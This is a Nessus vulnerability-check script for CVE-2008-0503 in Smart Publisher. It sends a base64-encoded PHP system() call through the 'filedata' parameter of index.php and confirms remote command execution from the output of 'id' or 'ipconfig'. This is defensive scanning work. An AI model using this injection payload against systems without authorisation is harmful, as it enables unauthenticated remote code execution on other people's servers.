#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(30124);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2008-0503");
  script_bugtraq_id(27488);
  script_xref(name:"milw0rm", value:"5003");
  script_xref(name:"OSVDB", value:"40780");

  script_name(english:"Smart Publisher index.php filedata Parameter Arbitrary Command Execution");
  script_summary(english:"Tries to run a command using Smart Publisher");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Smart Publisher, an open-source application
for website publishing. 

The version of Smart Publisher on the remote host fails to sanitize
input to the 'filedata' parameter of the 'index.php' script before
using it in an 'eval()' statement in the 'admin/op/disp.php' script to
evaluate PHP code.  An unauthenticated remote attacker can leverage
this issue to execute arbitrary code on the remote host subject to the
privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?0ab01de3" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Smart Publisher 1.0.2 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:C/I:C/A:C" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


os = get_kb_item("Host/OS");
if (os && "Windows" >!< os) cmd = "id";
else cmd = "ipconfig /all";


# Loop through directories.
dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue to run a command.
  req = http_get(
    item:string(
      dir, "/index.php?",
      "op=disp&",
      "filedata=", base64(str:string("system('", cmd, "');"))
    ), 
    port:port
  );
  req = str_replace(
    string:req,
    find:"User-Agent:",
    replace:string(
      "Direct Browser: 1\r\n",
      "User-Agent:"
    )
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If...
  if (
    # It's Smart Publisher and...
    "<TITLE>Smart Publisher" >< res &&
    # we get some command output
    (
      ("ipconfig" >< cmd && "Subnet Mask" >< res) ||
      ("id" == cmd && egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res))
    )
  )
  {
    output = res - strstr(res, "<HTML");

    if (report_verbosity && strlen(output))
    {
      report = string(
        "\n",
        "Nessus was able to execute the command '", cmd, "' on the remote\n",
        "host to produce the following results :\n",
        "\n",
        output
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}
